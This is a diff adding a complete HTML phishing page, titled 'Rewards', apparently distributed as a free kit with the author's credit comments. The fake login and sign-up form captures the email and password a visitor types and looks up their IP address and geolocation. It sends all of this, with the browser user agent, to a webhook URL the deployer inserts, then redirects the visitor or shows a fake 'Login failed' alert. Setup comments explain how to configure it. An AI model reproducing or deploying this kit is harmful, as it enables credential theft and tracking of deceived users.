@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+        <!-- I coded this for free for YOU. All I ask is that you keep this little blurb below to show appreciation!-->
+
+    <!--CODED BY RAYEN NOTH
+    https://linux.scot
+    https://untitledprojects.org
+
+     ________  ________      
+    |\   __  \|\   ___  \    
+    \ \  \|\  \ \  \\ \  \   
+     \ \   _  _\ \  \\ \  \  
+      \ \  \\  \\ \  \\ \  \ 
+       \ \__\\ _\\ \__\\ \__\
+        \|__|\|__|\|__| \|__|              
+    -->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rewards</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f0f0f0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .container {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    animation: slideInFromTop 0.5s ease;
+  }
+  @keyframes slideInFromTop {
+    0% {
+      transform: translateY(-50%);
+      opacity: 0;
+    }
+    100% {
+      transform: translateY(0);
+      opacity: 1;
+    }
+  }
+  .input-group {
+    margin-bottom: 20px;
+  }
+  .input-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    box-sizing: border-box;
+  }
+  .btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    background-color: #007bff;
+    color: #fff;
+    cursor: pointer;
+  }
+  .btn:hover {
+    background-color: #0056b3;
+  }
+  .social-buttons {
+    margin-top: 20px;
+  }
+  .social-buttons img {
+    width: 40px;
+    height: 40px;
+    margin-right: 10px;
+    cursor: pointer;
+  }
+  .disabled {
+    opacity: 0.5;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>Login</h2>
+  <div class="input-group">
+    <input id="email" type="text" placeholder="Email">
+  </div>
+  <div class="input-group">
+    <input id="password" type="password" placeholder="Password">
+  </div>
+  <button id="loginBtn" class="btn">Login</button>
+  <h3>Don't have an account? <a href="?id=signup">Sign Up</a></h3>
+</div>
+<script>
+const signUpButton = document.querySelector('a[href="?id=signup"]');
+const loginButton = document.getElementById('loginBtn');
+const signUpText = document.querySelector('h3');
+
+function getReferrer() {
+  const urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get('ref');
+}
+
+if (window.location.search === '?id=signup') {
+  signUpButton.style.display = 'none';
+  signUpText.style.display = 'none'; 
+  document.querySelector('h2').textContent = 'Sign Up';
+  document.querySelector('.btn').textContent = 'Sign Up';
+}
+
+signUpButton.addEventListener('click', function(e) {
+  e.preventDefault();
+  const referrer = getReferrer();
+  const redirectUrl = referrer ? `?id=signup&ref=${referrer}` : '?id=signup';
+  window.location.search = redirectUrl;
+});
+
+loginButton.addEventListener('click', function() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  const referrer = getReferrer();
+
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = data.ip;
+      
+      fetchGeolocationData(ipAddress, email, password, referrer);
+    })
+    .catch(error => {
+      console.error('Error fetching IP address:', error);
+    });
+});
+
+function fetchGeolocationData(ipAddress, email, password, referrer) {
+  fetch(`https://freeipapi.com/api/json/${ipAddress}`)
+    .then(response => response.json())
+    .then(data => {
+      const geoLocationData = JSON.stringify(data, null, 2); 
+
+      const embed = {
+        title: 'New Attempt',
+        description: `**Email:** ${email}\n**Password:** ${password}\n**More Info:** https://whatismyipaddress.com/ip/${ipAddress}` + (referrer ? `\n**Referrer:** ${referrer}` : ''),
+        fields: [
+          { name: 'IP Address', value: ipAddress },
+          { name: 'Geolocation', value: `\`\`\`json\n${geoLocationData}\n\`\`\`` },
+          { name: 'Device', value: navigator.userAgent }
+        ],
+        footer: {
+          text: 'Powered by linux.scot'
+        }
+      };
+
+      // CHANGE THE CONTENT IN webhookUrl OTHERWISE YOU WONT GET THE DATA
+      const webhookUrl = 'PUT_YOUR_WEBHOOK_URL_INBETWEEN_THE_APOSTROPHIES';
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ embeds: [embed] })
+      })
+        .then(response => {
+          if (response.ok) {
+            console.log('Embed sent successfully');
+            window.location.href = 'LINK_TO_YOUR_SITE'; // CHANGE THIS TO THE PAGE YOU WANT THE SITE TO REDIRECT TO AFTER EMBED IS SENT
+          } else {
+            console.error('Failed to send embed');
+            alert('Login failed. Please try again.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+        });
+    })
+    .catch(error => {
+      console.error('Error fetching geolocation data:', error);
+    });
+}
+</script>
+</body>
+</html>
